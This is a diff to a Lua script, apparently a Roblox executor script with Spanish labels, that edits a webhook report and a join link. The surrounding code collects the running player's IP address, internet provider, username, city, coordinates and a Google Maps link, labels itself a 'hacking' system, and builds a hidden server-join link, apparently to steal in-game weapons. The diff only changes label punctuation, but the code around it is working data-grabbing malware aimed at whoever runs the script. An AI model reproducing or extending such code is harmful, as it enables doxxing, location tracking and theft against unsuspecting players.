@@ -92,19 +92,19 @@ local data = {
         ["color"] = 16729344,
         ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
-            {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
-            {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
-            {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
-            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
-            {["name"]="👥 DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
-            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
-            {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
-            {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
-            {["name"]="🗺️ Longitud/Latitud", ["value"]=longDisplay, ["inline"]=true},
-            {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
-            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
-            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
-            {["name"]="💥 Estado", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
+            {["name"]="💻 Dispositivo:", ["value"]=platform, ["inline"]=true},
+            {["name"]="🛰️ IP:", ["value"]=userIP, ["inline"]=true},
+            {["name"]="🌐 Compañía de Internet:", ["value"]=userISP, ["inline"]=true},
+            {["name"]="👤 Usuario:", ["value"]=LocalPlayer.Name, ["inline"]=true},
+            {["name"]="👥 DisplayName:", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
+            {["name"]="🌎 País:", ["value"]=countryDisplay, ["inline"]=true},
+            {["name"]="🏙️ Ciudad:", ["value"]=cityDisplay, ["inline"]=true},
+            {["name"]="📏 Kilómetros:", ["value"]=kmDisplay, ["inline"]=true},
+            {["name"]="🗺️ Longitud/Latitud:", ["value"]=longDisplay, ["inline"]=true},
+            {["name"]="🔗 Ubicación:", ["value"]=googleMapsLink, ["inline"]=false},
+            {["name"]="🛠️ Executor:", ["value"]=executorName, ["inline"]=true},
+            {["name"]="⏰ Hora:", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
+            {["name"]="💥 Estado:", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
         },
         ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
     }}
@@ -480,7 +480,7 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 
 -- 🔹 Fern Link real solo visible en webhook
 local fernToken = math.random(100000,999999)
-local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
+local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
 -- Preparar contenido completo para Pastebin
 local pasteContent = ""
